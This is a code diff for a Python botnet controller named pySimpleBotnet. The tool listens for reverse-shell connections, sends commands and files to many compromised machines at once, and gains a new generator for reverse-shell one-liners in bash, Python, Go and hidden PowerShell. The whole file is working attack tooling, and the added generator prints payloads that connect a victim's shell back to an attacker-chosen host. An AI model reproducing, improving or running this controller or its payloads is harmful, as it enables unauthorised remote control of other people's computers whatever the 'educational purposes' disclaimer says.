@@ -1,6 +1,7 @@
+#!/usr/bin/python3
 import os, socket, threading, sys, time, queue
 
-#pySimpleBotnet is a software for listening and accepting connections (reverse shell) from remote computers. This software is also able to send files (at this time only *nix systems) to multiple computers and send commands to multiple computers
+# pySimpleBotnet is a software for listening and accepting connections (reverse shell) from remote computers. This software is also able to send files (at this time only *nix systems) to multiple computers and send commands to multiple computers
 # FOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE
 # by Hubert Kasperek
 # https://github.com/Hukasx0
@@ -14,7 +15,7 @@ selected_addr_g = []
 
 for i in range(1):
    q.put(i) # 0 and 1
-   
+
 def createSocket(host,port):
    try:
       sock.bind((host, int(port)))
@@ -23,7 +24,7 @@ def createSocket(host,port):
       create_threads()
    except socket.error:
       print('\033[93m'+"Error while creating a socket: "+str(socket.error))
-      
+
 def accept_cons():
    while True:
       try:
@@ -38,7 +39,7 @@ def accept_cons():
 def create_threads():
    for _ in range(1):
       threading.Thread(target=do_threads, daemon=True).start()
-   
+
 def do_threads():
    while True:
       _ = q.get()
@@ -70,28 +71,28 @@ def shell(num):
       time.sleep(0.05)
       rep = con.recv(20480).decode()
       sys.stdout.write(rep)
-   
+
 def select(s):
    if len(addr_g) >= (int(s)+1):
       selected_cons_g.append(cons_g[int(s)])
       selected_addr_g.append(addr_g[int(s)])
    else:
       print("Looks like connection with this ID does not exist")
-      
+
 def remove(s):
    if len(selected_cons_g) >= (int(s)+1):
       del selected_cons_g[int(s)]
       del selected_addr_g[int(s)]
    else:
       print("Looks like selection with this ID does not exist")
-      
+
 def show_selections():
    print("\nSelected connections\n")
    print("id\tconnection")
    for num, sel in enumerate(selected_addr_g):
       print(str(num)+"\t"+sel[0])
    print("\n")
-   
+
 def multi_command(target):
    if target == "a":
       while True:
@@ -115,7 +116,7 @@ def multi_command(target):
                time.sleep(0.05)
    else:
       print("multiexec a/s")
-   
+
 def system_shell():
    while True:
       cmd = input("pySB["+os.getcwd()+"]> ")
@@ -128,7 +129,7 @@ def system_shell():
          os.system(cmd)
       else:
          pass
-      
+
 def upload_files(file_name, target):
    fi = open(file_name, "r")
    data = fi.read()
@@ -142,8 +143,8 @@ def upload_files(file_name, target):
          time.sleep(0.05)
    else:
       print("upload a/s")
-   
-            
+
+
 def conn_check():
    print("id\tconnection\tremote port")
    for num, con in enumerate(cons_g):
@@ -156,21 +157,28 @@ def conn_check():
          del cons_g[num]
       if len(cons_g) > 0:
          print(str(num)+"\t"+str(addr_g[num][0])+"\t"+str(addr_g[num][1]))
-         
+
 def help_menu():
    print("\n\tpySimpleBotnet is a software for listening and accepting connections (reverse shell) from remote computers\n\tThis software is also able to send files (at this time only *nix systems) to multiple computers and send commands to multiple computers\n\tFOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE")
-   print("\n   pySB[*] shell\nhelp - help menu\nlisten [PORT] - listen on certain port\ncons - check connections\nclear - clear terminal\nselect [ID] - add connection to \"selected\" connections (useful when you want to send files/commands to multiple computers, but you don't want to send to all computers)\nos - operating system shell\nshow - show selected connections\nremove [ID] - remove connection from selected\nupload [FILE_PATH] a/s - upload file to remote machines\n   a - all connections\n   s - selected connections\nmultiexec a/s - execute commands on multiple computers\n   a - all connections\n   s - selected connections")
+   print("\n   start arguments\n-n - skip intro(no intro)\n-l [PORT] - start program with listening on a certain port\n-h - start program with help menu\n-g [IP] [PORT] - generate some reverse tcp shells\n-e - exit (useful if you want to only read help menu or generate reverse shells without running script)")
+   print("\n   pySB[*] shell\nhelp - help menu\nlisten [PORT] - listen on certain port\ncons - check connections\nclear - clear terminal\ngenerate [IP] [PORT] - generate some tcp reverse shells\nselect [ID] - add connection to \"selected\" connections (useful when you want to send files/commands to multiple computers, but you don't want to send to all computers)\nos - operating system shell\nshow - show selected connections\nremove [ID] - remove connection from selected\nupload [FILE_PATH] a/s - upload file to remote machines\n   a - all connections\n   s - selected connections\nmultiexec a/s - execute commands on multiple computers\n   a - all connections\n   s - selected connections")
    print("\n   os shell\nexit! - exit os shell")
    print("\n   reverse shell\nexit! - exit reverse shell\nupload! [FILE_PATH] - upload file to remote machine")
    print("\n   pySB[multiexec{}]\nexit! - exit\n")
-   
+
+def generate(ip, port):
+   print("\n\tGenerating example shells from https://github.com/swisskyrepo/PayloadsAllTheThings\n")
+   print("Bash tcp:\n\tbash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n\t0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196\n")
+   print("Python:\n\tpython -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n\tpython3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n")
+   print("Golang:\n\techo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+ip+":"+port+"\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n")
+   print("Powershell:\n\tpowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""+ip+"\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n")
 def intro():
    print("             ___________ ___   _   _____   \n            /  ___| ___ \  _/\| |/\_  \ \  \n _ __  _   _\ `--.| |_/ / | \ ` ' / | |\ \ \n| '_ \| | | |`--. \ ___ \ ||_     _|| | > >\n| |_) | |_| /\__/ / |_/ / | / , . \ | |/ / \n| .__/ \__, \____/\____/| |_\/|_|\/_| /_/  \n| |     __/ |           |___|     |___|    \n|_|    |___/                               \n")
    for char in "by Hubert Kasperek":
       time.sleep(0.15)
       sys.stdout.write(char)
       sys.stdout.flush()
-   print("\nhttps://github.com/hukasx0")
+   print("\nhttps://github.com/Hukasx0/pythonSimpleBotnet")
    print("FOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE\n")
 def main_shell():
    while True:
@@ -184,9 +192,15 @@ def main_shell():
          conn_check()
       elif ans[0] == "listen":
          if len(ans) > 1:
+            # ports below 1024 needs special privileges
             createSocket("",int(ans[1]))
          else:
             print("listen [PORT]")
+      elif ans[0] == "generate":
+          if len(ans) > 2:
+              generate(ans[1],ans[2])
+          else:
+              print("Generate [IP] [PORT]")
       elif ans[0] == "select":
          if len(ans) > 1:
             select(ans[1])
@@ -220,6 +234,19 @@ def main_shell():
             print("connect [ID]")
       else:
          pass
-
-intro()
+intro_o = True
+for i in range(1, len(sys.argv)):
+   if sys.argv[i] == "-n":
+      intro_o = False
+      print("pySimpleBotnet by Hubert Kasperek\nhttps://github.com/Hukasx0/pythonSimpleBotnet\nFOR EDUCATIONAL PURPOSES ONLY! THE CREATOR IS NOT LIABLE FOR DAMAGES CAUSED BY THE USE OF THE SOFTWARE")
+   elif sys.argv[i] == "-l":
+      createSocket("",int(sys.argv[i+1]))
+   elif sys.argv[i] == "-h":
+      help_menu()
+   elif sys.argv[i] == "-g":
+       generate(sys.argv[i+1],sys.argv[i+2])
+   elif sys.argv[i] == "-e":
+      exit()
+if intro_o:
+    intro()
 main_shell()
